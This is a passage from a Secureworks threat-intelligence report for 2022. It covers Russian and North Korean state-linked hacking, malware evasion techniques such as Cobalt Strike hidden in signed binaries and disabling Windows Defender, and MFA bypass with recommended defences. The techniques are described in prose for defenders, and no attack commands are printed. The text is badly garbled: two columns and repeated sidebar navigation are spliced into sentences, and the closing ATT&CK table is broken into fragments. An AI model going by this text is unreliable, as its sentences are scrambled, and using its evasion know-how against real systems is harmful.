attack76 targeting Viasat being one of only a handful of examples
Following the Putin-Biden Summit in June 2021, Russia showed
signs of dealing with its resident cybercriminals. In September of cyberattacks that had effects outside of Ukraine. Equally, there
Hostile Government- 2021 part of the Meris botnet was sinkholed after it attacked has been extensive coverage of disruptive attacks by hacktivists on
Russian targets. In January 2022 the FSB arrested 14 alleged
06 Sponsored Actor Activity both sides of the conflict, but their impact has been minor. For most
Shows a Regional Focus members of the GOLD SOUTHFIELD (REvil) ransomware
06 Secureworks customers, especially those without operations in Ukraine
group, and in February74 Russian authorities shut down three
carding forums, plus one selling RDP access to compromised or Russia, the impact has been very limited, with ransomware and other
Defense Evasion Offers Its environments, and arrested the CEO of a Russia-based domain cybercriminal activity remaining a far greater threat.
07 Own Detection Opportunities registrar. However, these arrests have not had a significant
impact on the cybercrime landscape, and for the most part
Russia-based cybercriminals continue to operate with impunity
07
so long as they do not target Russian interests. Cooperation
08 Conclusion
with the U.S. essentially ceased following the invasion
of Ukraine.
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 48

However, the regular stream of reporting77 from the Computer threat group, and some of it from China82. During a public presentation
01 Letter From Our CTIO Emergency Response Team of Ukraine (CERT-UA) describes a steady at the First conference in June 2022, CERT-UA revealed that it was
cadence of cyber activity directed against Ukrainian targets. Some tracking 43 threat groups and 1,306 cyber incidents so far in 2022. It is
of this activity is identifiably78 from Russian government-sponsored likely that the full effect of how Russian cyber capability has been used
Executive Summary
02 and Key Findings threat actors, some of it79 from threat actors using cybercriminal to support the military operations is not yet apparent to observers
tooling (although that may be to hide its origin), some of it from outside of Ukraine.
hacktivists, some80 from the potentially Belarussian MOONSCAPE81
Ransomware Remains the
03
Primary Strategic Threat
Ukraine Major Cyber Event Timeline
Ransomware Enablers:
04
Loaders and Infostealers
JANUARY 13-14 FEBRUARY 15 FEBRUARY 24 MARCH 28
Exploitation of Remote Cyber attacks using A series of DDOS attacks A cyberattack against Viasat’s Ukrainian fixed-line operator
05 Services is Now the Most WhisperGate wiper malware, knocked offline websites satellite KA-SAT network, likely Ukrtelecom confirms a
Common Access Vector tentatively attributed by the belonging to the Ukrainian intended to hamper Ukrainian cyberattack on its core
Ukrainian government to a army, defense ministry, communications during Russian infrastructure, describes as
Belarus-aligned group called and publicly-owned banks. invasion, causes collateral the most severe cyberattack
MOONSCAPE (also known damage in western Europe. since the start of the Russian
Hostile Government- as Ghostwriter or UNC1151), invasion in February.
deface and take down more
06 Sponsored Actor Activity
than a dozen Ukrainian
Shows a Regional Focus
06 government websites.
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion JANUARY 23 FEBRUARY 24 FEBRUARY 24 MARCH 15 MAY 15
A series of DDoS and A second wiper, dubbed Russia invades A third wiper named Russia-supporting
destructive wiper IsaacWiper is used in a Ukraine. CaddyWiper is hacktivistgroup Killnet
attacks using destructive attack detected in use against threatens a wave of
08 The Secureworks HermeticWiper against a Ukrainian Ukrainian networks. cyberattacks against
09
View of the Threat take place against governmental network. the U.S. and multiple
Ukrainian targets. European countries.
Figure 33: Timeline of significant initial activity connected with the Russian invasion of Ukraine. (Source: Secureworks)
2022 State of the Threat: A Year in Review 49

CTU researchers have observed limited Russian threat group activity
01 Letter From Our CTIO beyond what has been reported in open source. Of the Russian groups
tracked by CTU researchers, IRON TILDEN83 has been the most
visible, conducting spear phishing attacks primarily against neighboring
Executive Summary
02
and Key Findings Ukraine but also against Latvia’s Parliament in April.
Ransomware Remains the
03
Primary Strategic Threat
IRON TILDEN Threat Group Profile
Ransomware Enablers:
04 IRON TILDEN, also known as Gamaredon, has a history of
Loaders and Infostealers
conducting cyber espionage against Ukrainian targets of
interest, primarily in the government and defense verticals.
Active since at least 2013, the threat group's operations
Exploitation of Remote
typically consist of aggressive spear phishing campaigns that
05 Services is Now the Most
utilize malicious VBA scripts inside attached Microsoft Word or
Common Access Vector
Excel documents, designed to install information stealers on
compromised hosts. IRON TILDEN sacrifices some operational
security in favor of high tempo operations, meaning that its
Hostile Government-
infrastructure is identifiable through re-use of specific Dynamic
06 Sponsored Actor Activity
DNS providers, Russian hosting providers, and remote template
Shows a Regional Focus
06
injection techniques.
In November 2021, the Security Service of Ukraine (SSU)
Defense Evasion Offers Its
07 Own Detection Opportunities identified five IRON TILDEN members as officers in Russia's
FSB federal security service. Targeting the Saeima (the Latvian
parliament) aligns with the FSB's efforts to collect intelligence
07
on countries surrounding Russia. Latvia has endorsed Ukraine's
08 Conclusion
bid to join the European Union and passed measures that
support Ukraine and condemn Russian hostilities. These actions
could increase attention from foreign threat groups focused on
08 The Secureworks
09 espionage.
View of the Threat
2022 State of the Threat: A Year in Review 50

Before the invasion, CTU researchers assessed that Russia would only Ukraine have a broader impact, as was the case with the Viasat wiper
01 Letter From Our CTIO launch direct disruptive attacks against organizations in NATO member attack. However, Russia is likely attempting to calibrate its activity to
countries if there was a drastic escalation in tensions. That assessment avoid collateral damage that might provoke a more direct international
remains unchanged. There remains the possibility that attacks targeting response.
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
• BROMINE (Microsoft)
Ransomware Enablers: • Energetic Bear / Berserk Bear (CrowdStrike)
04 Loaders and Infostealers • TEMP.Isotope (FireEye)
IRON LIBERTY84 • ALLANITE (Dragos)
(Espionage) • Crouching Yeti (Kaspersky)
16th Center • Dragonfly (Symantec)
Exploitation of Remote
• DYMALLOY (Dragos)
05 Services is Now the Most
Common Access Vector
• Turla
• KRYPTON (Microsoft)
Federal Security IRON HUNTER85
• Venomous Bear (CrowdStrike)
Hostile Government- Service (FSB) (Espionage) • ITG12 (IBM)
06 Sponsored Actor Activity
• Waterburg (Symantec)
Shows a Regional Focus
06
• ACTINIUM (Microsoft)
• Primitive Bear (CrowdStrike)
Defense Evasion Offers Its
07 • Armageddon
Own Detection Opportunities
18th Center IRON TILDEN • Blue Otso (PwC)
(Espionage) • Dancing Salome (Kaspersky)
07 • Gamaredon
08 Conclusion • Shuckworm (Symantec)
• UAC-0010 (CERT-UA)
• WinterFlounder (iDefense)
08 The Secureworks
09
View of the Threat
Figure 34. Russian threat groups tracked by CTU researchers. (Source: Secureworks)
• YTTRIUM (Microsoft)
• Cozy Bear (CrowdStrike)
• APT29 (FireEye)
• The Dukes
• UNC2452 (Mandiant) 2022 State of the Threat: A Year in Review 51
Foreign Intelligence
Service (SVR)
• NOBELIUM (Microsoft)
• Dark Halo (Volexity)
• StellarParticle (CrowdStrike)
• UNC2452 (FireEye)

• BROMINE (Microsoft)
• Energetic Bear / Berserk Bear (CrowdStrike)
• TEMP.Isotope (FireEye)
• ALLANITE (Dragos)
• Crouching Yeti (Kaspersky)
16th Center • Dragonfly (Symantec)
• DYMALLOY (Dragos)
• Turla
• KRYPTON (Microsoft)
Federal Security
• Venomous Bear (CrowdStrike)
Service (FSB)
• ITG12 (IBM)
• Waterburg (Symantec)
• ACTINIUM (Microsoft)
• Primitive Bear (CrowdStrike)
• Armageddon
• Blue Otso (PwC)
18th Center
• Dancing Salome (Kaspersky)
• Gamaredon
• Shuckworm (Symantec)
• UAC-0010 (CERT-UA)
• WinterFlounder (iDefense)
01 Letter From Our CTIO • YTTRIUM (Microsoft)
• Cozy Bear (CrowdStrike)
IRON HEMLOCK86
• APT29 (FireEye)
(Espionage)
• The Dukes
Executive Summary
02 • UNC2452 (Mandiant)
and Key Findings
Foreign Intelligence
Ransomware Remains the Service (SVR)
03
Primary Strategic Threat
• NOBELIUM (Microsoft)
Ransomware Enablers: IRON RITUAL87 • Dark Halo (Volexity)
04 Loaders and Infostealers (Espionage) • StellarParticle (CrowdStrike)
• UNC2452 (FireEye)
Exploitation of Remote
05 Services is Now the Most • STRONTIUM (Microsoft)
Common Access Vector • Fancy Bear (CrowdStrike)
• APT28 (FireEye)
• Group 74 (Talos)
85th Main Special
IRON TWILIGHT88 • PawnStorm (Trend Micro)
Service Center
Hostile Government- (Espionage) • Sednit (ESET)
(GTsSS)
06 Sponsored Actor Activity • Snakemackerel (iDefense)
Shows a Regional Focus • Sofacy (Palo Alto)
06
• TG-4127 (SCWX CTU)
• Tsar Team (iSight)
Main Intelligence
Defense Evasion Offers Its
07 Directorate (GU/GRU)
Own Detection Opportunities
• IRIDIUM (Microsoft)
• BlackEnergy Group
07
• CTG-7263 (SCWX CTU)
08 Conclusion • ELECTRUM (Dragos)
• Hades/OlympicDestroyer (Kaspersky)
Main Center of IRON VIKING89
• IRIDIUM (Microsoft)
Special Technologies (Sabotage)
08 The Secureworks • Qudedagh (F-Secure)
09 • Sandworm Team (Trend Micro)
View of the Threat
• Telebots (ESET)
• TEMP.Noble (FireEye)
• Voodoo Bear (CrowdStrike)
Figure 34 (cont.). Russian threat groups tracked by CTU researchers. (Source: Secureworks)
2022 State of the Threat: A Year in Review 52

01 Letter From Our CTIO
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
Ransomware Enablers:
04
Loaders and Infostealers
Exploitation of Remote
05 Services is Now the Most
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity Democratic People's
Shows a Regional Focus
06
Republic of Korea
Defense Evasion Offers Its
07 Revenue Remains the Major Focus
Own Detection Opportunities
07
Main Motivations:
08 Conclusion
Financial Gain
Espionage
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 53

01 Letter From Our CTIO North Korea
Executive Summary
02
and Key Findings
For most North Korean threat groups, acquisitive crime remains the cryptocurrency exchanges since 2018, with some single thefts
major priority to provide income for the pariah state. This tasking is exceeding that amount. The focus has more recently expanded to
Ransomware Remains the
03 Primary Strategic Threat predominantly driven by the United Nations (UN) sanctions imposed decentralized finance (DeFi) organizations, their global cryptocurrency
on North Korea because of the country's ongoing engagement in a exchanges, and their users. In March 2022, NICKEL GLADSTONE94
nuclear weapons program. An expansion of effort in the past few years compromised some of the validator nodes of Ronin, an Ethereum-
Ransomware Enablers:
04 is likely driven by the impact on the North Korean economy from the based cryptocurrency wallet built and operated by Sky Mavis, resulting
Loaders and Infostealers
COVID-19 pandemic. This crisis exacerbated the effects of sanctions in theft of cryptocurrency then valued at over $540 million USD,
and isolated the DPRK from China, its closest trading partner. DPRK- making it one of the largest cryptocurrency heists ever.
Exploitation of Remote related threat groups appear to be under pressure to replenish the
05 Services is Now the Most country's diminishing coffers. In April 2022, U.S. agencies updated their reporting95 on NICKEL
Common Access Vector
GLADSTONE's activities, including the use of AppleJeus cryptocurrency
The main exception is a continuation through 2022 of NICKEL malware, stating that as of April the group had targeted various firms,
Hostile Government- ACADEMY's90 Operation Dream Job, which targeted the defense entities, and exchanges in the blockchain and cryptocurrency industry
06 Sponsored Actor Activity and aerospace sectors in 2020 with fake job offers, leading to the using spear-phishing campaigns and malware to steal cryptocurrency.
Shows a Regional Focus
06
installation of malware. Recently, the focus91 has been on the chemical A second campaign, named TraderTraitor, involved a set of malicious
sector. NICKEL KIMBALL92 activity also continued its focus on cyber cryptocurrency trading applications that targeted employees of
Defense Evasion Offers Its espionage and intelligence activities aimed at South Korean targets. organizations engaged in blockchain research. CTU researchers
07
Own Detection Opportunities
identified an additional phishing campaign that specifically targeted
cryptocurrency exchanges, which started in mid-2020 but has links to
07
activity from mid-2019 that was not attributed at the time. Analysis of
08 Conclusion Cryptocurrency in Their Sights
the infrastructure used across the campaigns suggests that NICKEL
GLADSTONE was responsible for these incidents.
Cryptocurrency and decentralized finance organizations (DeFi)
08 The Secureworks
09 View of the Threat have been a major focus of activity. North Korean threat groups
have reportedly93 stolen over $200 million USD annually from
2022 State of the Threat: A Year in Review 54

U.S. Agencies Strike Back
01 Letter From Our CTIO
Also in April 2022, the U.S. Treasury Department OFAC added96 an Multiple ransomware families have been linked to North Korea including
Executive Summary Ethereum wallet to its sanctions list after the wallet was used to launder TFlower, Maui, VHD Locker, PXJ, ZZZZ, BEAF, and ChiChi. None of these
02
and Key Findings
stolen funds from the Ronin theft. OFAC attributed this wallet to North have appeared in the Secureworks incident response case load to
Korean threat actors. It is unclear how effective the inclusion of the date. This suggests that either the scale of these campaigns is not on
Ethereum wallet on the OFAC sanctions list will be, given that it is just par with those of the established, mainly Russian-speaking cybercrime
Ransomware Remains the
03
Primary Strategic Threat one wallet, although it will make moving the funds harder and any groups or that the victims fall outside of the geographies generally
associated activity will attract increased scrutiny. The move also signals serviced by Secureworks.
that OFAC does not view cryptocurrencies as outside their remit, or the
Ransomware Enablers:
04 threat actors that use them as being untouchable. Also in March, the Nevertheless, the continued emergence of samples and evolution of
Loaders and Infostealers
U.S. Justice Department announced that a former Ethereum developer these ransomware families strongly suggests that this is one stream of
had been sentenced to over five years in prison for presenting at a revenue that North Korean operators will continue to pursue. Indeed,
Exploitation of Remote cryptocurrency conference in North Korea without obtaining a license ransomware may become an even greater focus than cryptocurrency
05 Services is Now the Most
from OFAC to attend. theft as a result of the volatility of cryptocurrencies. While the value
Common Access Vector
realized from the theft of cryptocurrency reserves is sensitive to
North Korean Ransomware changes in the value of that cryptocurrency, with ransomware the
Hostile Government- extortion demand can be increased to maintain the real-term value to
06 Sponsored Actor Activity Refilling State Coffers
the threat actors.
Shows a Regional Focus
06
North Korean groups continue to carry out ransomware attacks, which
are unambiguously for financial gain, although their scale and success
Defense Evasion Offers Its
07 Own Detection Opportunities rate remains unclear.
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 55

07
01 Letter From Our CTIO Defense Evasion
Offers Its Own
Executive Summary
02
and Key Findings
Detection
Ransomware Remains the
03
Primary Strategic Threat
Opportunities
Ransomware Enablers:
04
Loaders and Infostealers
To detect an intrusion before significant damage is done, network
defenders need to identify threat actor activity before the adversary
Exploitation of Remote
05 Services is Now the Most achieves their objectives. Network defenders really only need to 'get
Common Access Vector
lucky' once, but then must capitalize on that luck by reacting quickly.
Organizations ‘make their own luck’ through widespread monitoring
and well-rehearsed incident response plans.
Hostile Government-
06 Sponsored Actor Activity
06 Shows a Regional Focus Unsurprisingly, threat actors attempt to counter this by employing
evasion measures designed to circumvent security controls. However,
the use of an evasion technique sets its own pattern that can be
Defense Evasion Offers Its
07 Own Detection Opportunities monitored for and used to detect adversary activity.
07 Observed evasion techniques break down into two broad categories:
08 Conclusion operational design choices made prior to an intrusion, and tactical
actions once inside a network to shape the environment in a way that
08 The Secureworks benefits the attacker and hinders network defenders.
09
View of the Threat
2022 State of the Threat: A Year in Review 56

Evasion by Design
01 Letter From Our CTIO
When compiling malware, developers are turning to specific Hook removal and breakpoint detection. Looking for and
Executive Summary techniques to make their code harder to detect and therefore likely to disabling API hooking, commonly used by EDR tools to
02
and Key Findings
survive longer in the environments they deploy it to. These techniques intercept and record system API calls, is a technique used
include: by malware such as GuLoader99. Other evasion techniques
implemented by commodity malware such as GuLoader,
Ransomware Remains the
03 Primary Strategic Threat Use of less common languages such as Rust and Go for FormBook and BazarLoader include detecting and avoiding
malware development. Newer languages are, in some cases, debugger breakpoints, implementation of sleep commands
easier to use and help in evading signature-based detections that delay execution in a sandbox environment, insertion
Ransomware Enablers:
04 and malware analysis tools. of ransom instructions to prevent signature detection, and
Loaders and Infostealers
searching for evidence of a virtual machine environment.
Payload size padding. Large payloads are often skipped
Exploitation of Remote by antivirus systems in the name of efficiency. Sandboxes DLL sideloading. Despite having been around since the year
05 Services is Now the Most
typically will not detonate large files. CTU researchers 2000, DLL sideloading continues to be effective for many
Common Access Vector
observed Chinese threat group BRONZE BUTLER97 add threat actors. Malware that uses this technique includes
padding to a LowMain downloader file to take it to over 50MB the HUI Loader and ShadowPad malware described earlier,
Hostile Government- to circumvent antivirus scanning, in addition to using various PlugX, and the Vatet loader favored by the GOLD DUPONT100
06 Sponsored Actor Activity
obfuscation techniques including the Opaque Predicates98 ransomware group.
Shows a Regional Focus
06
code obfuscation technique.
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 57

Raspberry Robin — Incorporating
01 Letter From Our CTIO
Multiple Evasion Techniques
Executive Summary
02 In early 2022, a number of Secureworks customers were impacted by The malware also used alternative syntax (such as the use of
and Key Findings
a new USB worm dubbed 'Raspberry Robin', which uses a number of backslashes) in HTTP requests and removed spaces between
different evasion techniques in an attempt to evade detection. The command line switches in an effort to evade string-matching
Ransomware Remains the worm uses the trusted Windows Installer (msiexec.exe) process to signatures.
03
Primary Strategic Threat
beacon out to its C2 infrastructure, which often sits on compromised
QNAP devices101, using HTTP requests that contain a victim's user and
Ransomware Enablers: device names. CTU researchers also observed Raspberry Robin use
04
Loaders and Infostealers TOR exit nodes as additional C2 infrastructure.
It also used undocumented command line switches and unusual piping
Exploitation of Remote
05 Services is Now the Most commands to evade countermeasures that interpret command line Figure 36. Additional Raspberry Robin defensive evasion. (Source: Secureworks)
Common Access Vector arguments (figure 35).
CTU researchers observed the threat actor attempting several User
Hostile Government-
Account Control (UAC) bypass techniques before ultimately managing
06 Sponsored Actor Activity
Shows a Regional Focus to execute a DLL payload with a non-standard extension, another
06
evasion technique (figure 37). In the screenshot, the threat actor is
also proxying the DLL execution by using the regsvr functionality within
Defense Evasion Offers Its
07 the database tool odbcconf102, yet another evasion technique.
Own Detection Opportunities
07
08 Conclusion
Figure 35. Raspberry Robin use of undocumented command line switches and
pipe commands. (Source: Secureworks)
08 The Secureworks
09
View of the Threat
Figure 37. Raspberry Robin User Account Control bypass. (Source:
Secureworks)
2022 State of the Threat: A Year in Review 58

Hiding Behind a Veil of
01 Letter From Our CTIO
Legitimacy — Embedding
Executive Summary Cobalt Strike in the
02
and Key Findings
Authenticode Signature
Ransomware Remains the In mid-2021, CTU researchers analyzed a BRONZE ATLAS103 Cobalt
03
Primary Strategic Threat
Strike loader recovered from a network intrusion against a U.S. entity.
The decrypted loader configuration identified the location of the
Ransomware Enablers: Cobalt Strike payload file on disk, C:\Users\Public\NTUSER.DAT. NTUSER.
04
Loaders and Infostealers DAT was a signed Windows DLL file (UXLibRes.dll) that included an
encrypted Cobalt Strike payload after the Authenticode104 signature
(figure 38).
Exploitation of Remote
05 Services is Now the Most
Common Access Vector Embedding the payload in this way does not break the verification Figure 38. Cobalt Strike payload embedded in digitally signed Windows binary.
(Source: Secureworks)
of the Authenticode signature, leaving the NTUSER.dat file looking
legitimate based on having a valid digital signature. Microsoft released
Hostile Government-
06 Sponsored Actor Activity
a security update (MS13-098105) to address this vulnerability in 2013,
06 Shows a Regional Focus but the change is an opt-in feature106.
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 59

Shaping the Environment
01 Letter From Our CTIO
to Bypass Security Controls
Executive Summary
02 Having gained access to an environment, threat actors may find • During a Ryuk-related network intrusion in September
and Key Findings
that their freedom of movement is restricted (either deliberately or 2021, the ransomware operator added a firewall rule to
otherwise) by the network architecture, security controls in place, or permit outbound network traffic for a legitimate mobsync.
Ransomware Remains the the permissions they have when they gain access. CTU researchers exe process that had been injected with Cobalt Strike.
03
Primary Strategic Threat
commonly see threat actors take steps to bypass those restrictions. Preventing or at least delaying an adversary from being able
Some specific examples include: to escalate privileges to the point where they can manually
Ransomware Enablers: disable security controls is critical.
04
Loaders and Infostealers • In mid-2021, a threat actor successfully broke out of
a Citrix environment using the ‘Open With’ dialog box • In November 2021, a threat actor leveraged the ProxyShell
within a Microsoft Office application before conducting a vulnerability to access an internet-facing server and deploy
Exploitation of Remote
05 Services is Now the Most Kerberoasting attack to obtain privileged credentials. This Cobalt Strike. While doing so, the threat actor cleared
Common Access Vector Citrix break-out technique has been well documented for Windows event logs on the compromised server using a
many years. Organizations should perform regular security simple for loop on the command line (figure 39).
testing to identify any potential 'escape routes' from
Hostile Government-
06 Sponsored Actor Activity constrained environments.
Shows a Regional Focus
06
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat Figure 39. Command line to clear Windows event logs. (Source: Secureworks)
2022 State of the Threat: A Year in Review 60

• In December 2021, a threat actor compromised an internet- • In mid-2022, a threat actor conducting a BEC attack
01 Letter From Our CTIO facing server leveraging the Log4Shell vulnerability and created a mail-forwarding rule to forward all received emails
issued a Base64-encoded PowerShell command to disable to an external email address. Mail forwarding rules are
Windows Defender (figure 40). Base64-encoding can make common in email account compromises, as threat actors
Executive Summary
02
and Key Findings command line arguments harder for analysts and security seek to hide their activities from the compromised user,
tools to parse, but the presence of Base64-encoded but it is possible to detect this activity through effective
commands alongside other suspicious events provides its monitoring of cloud APIs.
Ransomware Remains the
03 own detection opportunity.
Primary Strategic Threat
Ransomware Enablers:
04
Loaders and Infostealers
Exploitation of Remote
05 Services is Now the Most
Common Access Vector
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06
Figure 40. Encoded PowerShell used to disable Defender. (Source:
Secureworks)
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
Figure 41. Taegis XDR telemetry showing creation of mail forwarding rule by
threat actor. (Source: Secureworks)
2022 State of the Threat: A Year in Review 61

This handful of examples is indicative of the sorts of defensive evasion
01 Letter From Our CTIO and anti-analysis techniques routinely encountered by Secureworks
incident responders. One thing that is notable about them is that none
of these techniques are particularly sophisticated. That is because
Executive Summary
02
and Key Findings threat actors do not need them to be; the adversary will only innovate
enough to achieve their objectives, so there is a direct relationship
between the maturity of the controls in a target environment and the
Ransomware Remains the
03 techniques they employ to bypass those controls. Another notable
Primary Strategic Threat
point is that these techniques create patterns that can be used for
detecting threat actor activity.
Ransomware Enablers:
04
Loaders and Infostealers
Organizations should ensure that they have preventative controls
implemented to make it harder for an adversary to gain initial access to
Exploitation of Remote their environment, as well as monitoring tools that challenge a threat
05 Services is Now the Most actor's ability to remain hidden within the environment. The objective
Common Access Vector
should be to raise the cost for the adversary and, particularly for
opportunistic threat actors, encourage them to go elsewhere.
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 62

Bypassing MFA
01 Letter From Our CTIO
Credential abuse still represents a substantial proportion of IAVs. Multi- reverse proxies to snoop on existing browser sessions to harvest
Executive Summary factor authentication is an important preventative control, especially credentials and session cookies as they appear on screen. This allows
02
and Key Findings
for internet-facing applications and accounts with access to critical threat actors to hijack already authenticated sessions, bypassing MFA.
resources. But Secureworks incident responders see regular examples Another method110 used Microsoft Edge WebView2 applications to
of MFA being bypassed through various techniques. On a number of steal a user's authentication cookies and log into stolen accounts,
Ransomware Remains the
03
Primary Strategic Threat occasions, threat actors have compromised accounts that have not yet even when secured with MFA.
been enrolled in MFA and have registered their own device. In March
2022, CISA reported107 on a Russian government-sponsored threat Implementing MFA Properly
Ransomware Enablers:
04 actor doing the same thing.
Loaders and Infostealers
• Implement MFA across all accounts, including service
accounts, particularly for remote access to corporate
Another common scenario encountered during Secureworks incident
Exploitation of Remote response is 'prompt bombing', where a threat actor attempts to access resources. This can be achieved by coupling the MFA
05 Services is Now the Most solution to the organization's identity provider.
a legitimate MFA-protected account through repeated login attempts,
Common Access Vector
generating multiple MFA prompts in the hope that exasperation
• Disable legacy protocols that do not support MFA, including
or distraction drives the legitimate user to approve one of them.
Microsoft's Basic Auth, which reaches end of life on
Hostile Government- The threat actor may generate multiple requests in a short time
October 1, 2022.
06 Sponsored Actor Activity
period, send one or two prompts a day or employ telephone social
Shows a Regional Focus
06
engineering. • Use a service that requires complex interaction to approve
logins (e.g., number matching or other types of manual
Defense Evasion Offers Its In one incident observed by CTU researchers, a threat actor used code input) rather than simple 'click-to-approve' services.
07
Own Detection Opportunities
this technique to gain access to the environment and then request a
• Implement MFA on accounts with access to critical assets,
password reset on multiple social media accounts owned by the victim.
07
even for already authenticated users.
08 Conclusion The threat actors then sent convincing phishing emails to over 1,000
employees at the victim's organization in an attempt to compromise • Train users to recognize and report suspicious behaviors.
other accounts. 'Prompt bombing' has also reportedly108 been used
08 The Secureworks by the GOLD RAINFOREST (also known as Lapsus$) and IRON RITUAL • Implement MFA as part of a layered security strategy.
09
View of the Threat
threat groups.
• Use network segmentation to prevent the ability of threat
actors who have gained access to carry out lateral
More esoteric techniques reported on by third parties during the
movement.
year also included the use109 of phishing kits that use transparent
2022 State of the Threat: A Year in Review 63

08
01 Letter From Our CTIO Conclusion
Executive Summary
02
and Key Findings
Over the past year, the threat landscape has changed greatly in some is critical. Identify the assets you own, maintain awareness of what
ways, yet in other ways scarcely at all. War in Ukraine has unleashed is happening in the threat landscape, and prioritize your control
Ransomware Remains the
a flood of highly targeted cyber activity, but for the most part, it framework according to your business risk profile. Adopt a prioritized
03
Primary Strategic Threat
has remained laser-focused on Ukraine. For most organizations, approach to vulnerability management. Ensure that internet-facing
ransomware, like last year and the year before, remains the most systems and sensitive internal systems are protected with MFA, leaving
Ransomware Enablers: pressing threat. Law enforcement is undoubtedly becoming more no loopholes for threat actors to take advantage of. And instrument
04
Loaders and Infostealers
aggressive and effective in disrupting the cybercriminal ecosystem, your network to provide comprehensive monitoring of endpoint,
but these interventions are yet to radically alter the landscape. Gaps network, and cloud resources.
that have appeared in that ecosystem are quickly filled, either by the
Exploitation of Remote
05 Services is Now the Most emergence of new actors or the re-emergence of those previously These time-tried approaches, underpinned with ever-improving
Common Access Vector
thought to have retired. Malware of all types continues to evolve technology solutions such as XDR, DDoS protection, and vulnerability
without breaking any radically new ground, and threat actors are not prioritization, protect against nation-state, cybercriminal, and hacktivist
yet having to be particularly innovative in order to be successful. threat actors alike. Now is not the time to let your guard slip.
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06 For organizations facing this picture, the pressure continues to be
relentless. Implementing good fundamental cybersecurity hygiene
Defense Evasion Offers Its
07
Own Detection Opportunities
07
08 Conclusion
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 64

09
01 Letter From Our CTIO The Secureworks
View of the Threat
Executive Summary
02
and Key Findings
Ransomware Remains the
03 Secureworks' view of the threat landscape comes from a combination This data combines to produce a detailed and compelling picture
Primary Strategic Threat
of telemetry from the Taegis XDR and VDR platforms, incident response of threat actor behavior that portrays both the thrust of their high-
and Secureworks Adversary Group customer engagements, and level tactics and the technical details of their tooling. It powers the
Ransomware Enablers:
technical and tactical research conducted by the Counter Threat Unit. expert threat intelligence products published every week by the CTU,
04
Loaders and Infostealers
Together, that combines to produce a unique level of visibility into and the unified "Rosetta Stone" that relates our threat groups to the
threat actor intent, capability, and activity; and just as importantly, into naming conventions used by other TI providers. And it contributes to
Exploitation of Remote what organizations need to do to reduce their risk. a repository of knowledge that drives the elite threat detection and
05 Services is Now the Most integrated response actions that Taegis delivers.
Common Access Vector
• In the 12 months from July 2021, the Secureworks Incident
Response team and Secureworks Counter Threat Unit
Actionable Intelligence Based
conducted over 1,400+ incident response engagements,
Hostile Government-
across a wide spectrum of industry sectors. on Breadth and Depth
06 Sponsored Actor Activity
Shows a Regional Focus
06 • Secureworks processes approximately 3.29 trillion event of Understanding
logs a week, or around 470 billion logs every single working
day, gathered from security infrastructure in thousands of
Defense Evasion Offers Its To be useful, threat intelligence has to be actionable. That means
07 customer environments around the world.
Own Detection Opportunities
providing context on relevant threats in the form of written threat
• CTU researchers gather and analyze data from internally intelligence, webcasts, and threat briefings. It also means deploying
07
generated and externally collected telemetry, from multiple insights directly to the Taegis platform in the form of countermeasures,
08 Conclusion
sources including publicly available information, dark
indicators, and advanced detectors.
web forums, proprietary botnet emulation systems, and
intelligence relationships.
08 The Secureworks
09
View of the Threat
2022 State of the Threat: A Year in Review 65

Drawing on a broad and deep understanding of the threat, CTU-derived
| 01 Letter From Our CTIO | countermeasures provide detection value across the entirety of the  |     |     |     |     |     |     |     |     |     |     |     |     |
| ----------------------- | ------------------------------------------------------------------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
attack lifespan. Figure 42 shows a heat map of detections, mapped
to ATT&CK techniques, for confirmed and mitigated security incident
Executive Summary
02 investigations within the Taegis XDR platform between June 2021 and
and Key Findings
June 2022.
Ransomware Remains the
03 Primary Strategic Threat
Reconnaissance Resource Development Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command & Control Exfiltration Impact
|     |     |     | C o m m a n d  and Scripting  |     | A b u s e  E l ev a t io n |   A b u s e  E l ev a t io n |     |     | E x p lo it a tion of Remote  |     |     |     |     |
| --- | --- | --- | ----------------------------- | --- | -------------------------- | ---------------------------- | --- | --- | ----------------------------- | --- | --- | --- | --- |
Active Scanning Acquire Infrastructure Drive-by Compromise In te rp r e te r Account Manipulation C o n tr o l  M e c h a n ism C o n tr o l  M e c h a n ism Adversary-in-the-Middle Account Discovery S e rv ic e s Adversary-in-the-Middle Application Layer Protocol Automated Exfiltration Account Access Removal
G a th er   V ic tim Host  E x p l o it  P ub lic-Facing  C o n t ai n e r Administration  A c c e s s  T o k e n  A c c e s s  T o k e n  A p p l ic a t io n Window  C o m m u n i c a tio n   T hrough
In fo rm a t io n Compromise Accounts A p p l ic a tio n C o m m a n d BITS Jobs M a n ip u l a ti o n M a n ip u l a ti o n Brute Force D is c o v e r y Internal Spearphishing Archive Collected Data Re m o v a b l e  M e d i a Data Transfer Size Limits Data Destruction
G a th er   V ic tim Identity  B o o t  o r  L o g o n   B o o t  o r  L o g o n   BITS Jobs C re d en t i a l s  f ro m   B r o w s e r   Bookmark  E x fi l t ra t i o n   O v e r
